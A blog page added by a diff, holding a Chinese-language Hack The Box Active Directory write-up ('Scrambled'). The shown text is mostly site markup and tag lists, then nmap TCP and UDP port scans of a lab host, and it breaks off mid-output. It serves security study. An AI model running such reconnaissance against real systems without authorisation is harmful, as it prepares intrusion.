@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+
+
+<html theme="dark" showBanner="true" hasBanner="desktop" > 
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
+<script src="/js/color.global.min.js" ></script>
+<script src="/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-84TPQBH5EH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-84TPQBH5EH');
+</script>
+<!-- End Google Analytics -->
+
+  
+  
+
+  
+  <title>Tracks-AD-Scrambled | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+
+  <meta name="description" content="解决了困扰了我很久的ldaps需要证书，和smb的krb认证连接问题  Nmap123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495010.10.11.168└─$ sudo nmap -sS 10.10.11.168  -p- --min-rate&#x3D;2000Start">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tracks-AD-Scrambled">
+<meta property="og:url" content="http://example.com/2025/01/04/Tracks-AD-Scrambled/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="解决了困扰了我很久的ldaps需要证书，和smb的krb认证连接问题  Nmap123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495010.10.11.168└─$ sudo nmap -sS 10.10.11.168  -p- --min-rate&#x3D;2000Start">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/wpimages/2024/tracks-ad/Scrambled/background.jpg">
+<meta property="article:published_time" content="2025-01-04T10:18:37.000Z">
+<meta property="article:modified_time" content="2025-01-04T13:36:32.844Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="AD">
+<meta property="article:tag" content="mssql">
+<meta property="article:tag" content="C#">
+<meta property="article:tag" content="ldaps">
+<meta property="article:tag" content="tgt">
+<meta property="article:tag" content="impacket-GetUserSPNs">
+<meta property="article:tag" content="sliver ticketer">
+<meta property="article:tag" content="impacket-smbclient">
+<meta property="article:tag" content="NTHASH">
+<meta property="article:tag" content="DLL">
+<meta property="article:tag" content="ysoserial.net">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/wpimages/2024/tracks-ad/Scrambled/background.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+  
+  
+    
+<div id="banner" class="">
+  <img src="/images/backgroup.jpg" itemprop="image">
+  <div id="banner-dim"></div>
+</div>
+ 
+   
+  <div id="main-grid" class="  ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>Hexo </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
+      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
+    </a>
+    
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
+        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
+      </a>
+    
+    <div id="nav-menu-btn" class="nav-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
+    </div>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <image src=/images/avatar.jpg></image>
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">Flower </div>
+      <div class="dot"></div>
+      <div class="subtitle">Hi Im Flower </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
+         
+      </div>  
+    </div>
+  </div>
+</div>
+
+  
+    
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Tags</h3>
+      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AS-REQ-ST/" rel="tag">AS-REQ ST</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AllowedtoAct/" rel="tag">AllowedtoAct</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/C/" rel="tag">C#</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/C/" rel="tag">C++</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-36467/" rel="tag">CVE-2024-36467</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-42327/" rel="tag">CVE-2024-42327</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DACL/" rel="tag">DACL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DLL/" rel="tag">DLL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Forensic/" rel="tag">Forensic</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/NTHASH/" rel="tag">NTHASH</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nmap/" rel="tag">Nmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PSReadLine/" rel="tag">PSReadLine</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PasstheCert/" rel="tag">PasstheCert</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Rubeus/" rel="tag">Rubeus</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SQL-injection/" rel="tag">SQL injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeBackupPrivilege/" rel="tag">SeBackupPrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Server-Operators/" rel="tag">Server Operators</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tips/" rel="tag">Tips</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteOwner/" rel="tag">WriteOwner</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Zabbix/" rel="tag">Zabbix</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ansible-vault/" rel="tag">ansible_vault</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/aws/" rel="tag">aws</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azure-devops/" rel="tag">azure devops</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azureAD/" rel="tag">azureAD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/browser/" rel="tag">browser</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/brute-rid/" rel="tag">brute-rid</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-kerberos-only/" rel="tag">bypass-kerberos-only</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cd/" rel="tag">cd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/consul/" rel="tag">consul</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/deb/" rel="tag">deb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dpapi/" rel="tag">dpapi</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/edge/" rel="tag">edge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc1/" rel="tag">esc1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fishing/" rel="tag">fishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gamepwn/" rel="tag">gamepwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ghost/" rel="tag">ghost</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/h2/" rel="tag">h2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-GetUserSPNs/" rel="tag">impacket-GetUserSPNs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-smbclient/" rel="tag">impacket-smbclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jwt/" rel="tag">jwt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kcd/" rel="tag">kcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/laps/" rel="tag">laps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldap/" rel="tag">ldap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldaps/" rel="tag">ldaps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/limesurvey/" rel="tag">limesurvey</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mail/" rel="tag">mail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/merge/" rel="tag">merge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mssql/" rel="tag">mssql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nginx/" rel="tag">nginx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/no-preAuth/" rel="tag">no-preAuth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfx/" rel="tag">pfx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/poc/" rel="tag">poc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pod/" rel="tag">pod</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pods/" rel="tag">pods</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pre2k/" rel="tag">pre2k</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rbcd/" rel="tag">rbcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/remote-potato/" rel="tag">remote-potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rootkit/" rel="tag">rootkit</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rosating/" rel="tag">rosating</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/s3/" rel="tag">s3</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sercerts/" rel="tag">sercerts</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sherlocks/" rel="tag">sherlocks</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sliver-ticketer/" rel="tag">sliver ticketer</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqlcmd/" rel="tag">sqlcmd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ssti/" rel="tag">ssti</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/study/" rel="tag">study</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/svn/" rel="tag">svn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/symlink/" rel="tag">symlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/tgt/" rel="tag">tgt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/winlogon/" rel="tag">winlogon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ysoserial-net/" rel="tag">ysoserial.net</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/zip/" rel="tag">zip</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%9E%E4%BE%8B%E8%AE%B0%E5%BD%95/" rel="tag">实例记录</a></li></ul>
+    </div>
+  </div>
+
+
+  
+  <div class="sticky">
+    
+      
+
+
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Categories</h3>
+      <div class="category-box">
+            <a class="category-link" href="/categories/cloud/">
+                cloud
+                <div class="category-count">7</div>
+            </a>
+        
+            <a class="category-link" href="/categories/htb-Season-5/">
+                htb-Season-5
+                <div class="category-count">7</div>
+            </a>
+        
+            <a class="category-link" href="/categories/htb-Season-6/">
+                htb-Season-6
+                <div class="category-count">10</div>
+            </a>
+        
+            <a class="category-link" href="/categories/htb-Season-4/">
+                htb-Season-4
+                <div class="category-count">3</div>
+            </a>
+        
+            <a class="category-link" href="/categories/ctf/">
+                ctf
+                <div class="category-count">7</div>
+            </a>
+        
+            <a class="category-link" href="/categories/Sherlocks/">
+                Sherlocks
+                <div class="category-count">1</div>
+            </a>
+        
+            <a class="category-link" href="/categories/AD/">
+                AD
+                <div class="category-count">7</div>
+            </a>
+        
+            <a class="category-link" href="/categories/CVE/">
+                CVE
+                <div class="category-count">1</div>
+            </a>
+        
+            <a class="category-link" href="/categories/forensic/">
+                forensic
+                <div class="category-count">2</div>
+            </a>
+        </div>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Recent Posts</h3>
+      <ul>
+        
+          <a class="recent-link" href="/2025/01/04/Tracks-AD-Scrambled/" title="Tracks-AD-Scrambled" >
+            <div class="recent-link-text">
+              Tracks-AD-Scrambled
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2025/01/04/Tracks-AD-Return/" title="Tracks-AD-Return" >
+            <div class="recent-link-text">
+              Tracks-AD-Return
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/12/31/Tracks-AD-StreamIO/" title="Tracks-AD-StreamIO" >
+            <div class="recent-link-text">
+              Tracks-AD-StreamIO
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/12/31/Tracks-AD-Escape/" title="Tracks-AD-Escape" >
+            <div class="recent-link-text">
+              Tracks-AD-Escape
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/12/31/Tracks-AD-Timelapse/" title="Tracks-AD-Timelapse" >
+            <div class="recent-link-text">
+              Tracks-AD-Timelapse
+            </div>
+          </a>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+
+<article id="post-Tracks-AD-Scrambled" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+    
+<div class="article-gallery">
+  <div class="article-gallery-photos">
+    
+      <a class="article-gallery-img" rel="gallery_cm5i87nnl00009cky5lj363po">
+        <img src="/wpimages/2024/tracks-ad/Scrambled/background.jpg" itemprop="image">
+      </a>
+    
+  </div>
+</div>
+
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        Tracks-AD-Scrambled
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2025-01-04T10:18:37.000Z" itemprop="datePublished">2025-01-04</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+    Uncategorized 
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            27k words 
+          </div>
+        </div>
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/" rel="tag">C#</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DLL/" rel="tag">DLL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/NTHASH/" rel="tag">NTHASH</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/impacket-GetUserSPNs/" rel="tag">impacket-GetUserSPNs</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/impacket-smbclient/" rel="tag">impacket-smbclient</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ldaps/" rel="tag">ldaps</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/mssql/" rel="tag">mssql</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sliver-ticketer/" rel="tag">sliver ticketer</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tgt/" rel="tag">tgt</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ysoserial-net/" rel="tag">ysoserial.net</a></li></ul>
+
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <blockquote>
+<p>解决了困扰了我很久的ldaps需要证书，和smb的krb认证连接问题</p>
+</blockquote>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.168</span><br><span class="line"></span><br><span class="line">└─$ sudo nmap -sS 10.10.11.168  -p- --min-rate=2000</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 03:31 EST</span><br><span class="line">Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 37.25% done; ETC: 03:33 (0:01:01 remaining)</span><br><span class="line">Stats: 0:01:38 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 99.99% done; ETC: 03:33 (0:00:00 remaining)</span><br><span class="line">Nmap scan report for 10.10.11.168</span><br><span class="line">Host is up (0.13s latency).</span><br><span class="line">Not shown: 65514 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">80/tcp    open  http</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">1433/tcp  open  ms-sql-s</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">3269/tcp  open  globalcatLDAPssl</span><br><span class="line">4411/tcp  open  found</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49673/tcp open  unknown</span><br><span class="line">49674/tcp open  unknown</span><br><span class="line">49700/tcp open  unknown</span><br><span class="line">49705/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 98.57 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">└─$ sudo nmap -sU 10.10.11.168 --top-ports=200 --min-rate=2000</span><br><span class="line">[sudo] password for fonllge:</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 03:32 EST</span><br><span class="line">Nmap scan report for 10.10.11.168</span><br><span class="line">Host is up (0.13s latency).</span><br><span class="line">Not shown: 196 open|filtered udp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">53/udp  open  domain</span><br><span class="line">88/udp  open  kerberos-sec</span><br><span class="line">123/udp open  ntp</span><br><span class="line">389/udp open  